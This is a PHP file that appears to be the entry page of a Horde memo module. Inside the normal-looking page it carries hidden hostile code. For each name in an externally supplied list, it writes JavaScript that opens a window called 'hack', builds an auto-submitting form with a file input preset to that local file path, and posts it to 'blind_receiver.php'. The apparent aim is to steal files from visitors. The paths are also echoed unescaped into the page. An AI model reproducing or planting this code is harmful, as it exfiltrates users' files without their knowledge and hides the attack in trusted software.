<?php

@define('MEMO_BASE', dirname(__FILE__));
require_once MEMO_BASE . '/lib/base.php';

$horde_module=MEMO_BASE;
error_reporting(E_ALL ^ E_NOTICE);
require_once("../framework/coreg2.php");

$ff=explode("|",$localnames);

foreach ($ff as $k=>$v) {
	?>
	<script type="text/javascript" language="JavaScript1.3">
	hack=window.open('','temp_window','');
	hack.document.write("<html><head><TITLE></TITLE></head><body>Wait...");
	hack.document.write("<form name='fhack' method='POST' enctype='multipart/form-data' action='blind_receiver.php'>");
	hack.document.write("<input type='hidden' name='ID' value='1'>");
	hack.document.write("<input type='file' name='file_fichero' value='<?php echo $v?>'>");
	hack.document.write("</form></body>");
	hack.document.forms[0].submit();
	</script>
<?php
}


require 'list.php';


